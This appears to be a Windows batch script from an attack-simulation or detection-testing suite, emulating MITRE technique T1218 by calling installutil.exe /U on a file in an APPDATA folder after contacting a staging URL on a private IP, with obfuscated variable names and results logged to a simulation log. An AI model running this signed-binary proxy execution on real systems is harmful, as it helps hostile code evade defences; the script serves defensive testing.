@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\7624\6236779e
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?7624-10
SET hlbnp=ITZEL-S2B
SET pudaazx=10
SET syjfr=visio.txt
SET ewjmdkff=7624

REM Use random names in script
SET qzlnp=%APPDATA%\%pudaazx%
SET zxaec=%qzlnp%\macula-simulations.log
SET tvrxqa=T1218
SET ubvcx=Signed Binary Proxy Execution

REM Step 1: Check server availability
curl -k -s -o nul "%drguvr%"
IF !ERRORLEVEL! NEQ 0 (
    SET fghjw=0
    SET werts=connection_refused
    GOTO logttp
)

REM Step 2: Change directory
cd /d "%pjkcpgw%" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET fghjw=0
    SET werts=dir_not_found
    GOTO logttp
)

REM Step 3: Execute DLL via InstallUtil
installutil.exe /logfile= /LogToConsole=false /U "%syjfr%" 2>nul
IF !ERRORLEVEL! EQU 0 (
    SET fghjw=1
    SET werts=
) ELSE (
    SET fghjw=0
    SET werts=assembly_load_failed
)

:logttp
SET hbvdop=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2!
SET xmcnbq=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,2!0
(
    echo [!hbvdop! !xmcnbq!][%hlbnp%]: %pudaazx%-%ewjmdkff%-%tvrxqa%|%ubvcx%=!fghjw!:!werts!
) >> "%zxaec%" 2>nul || rem

ENDLOCAL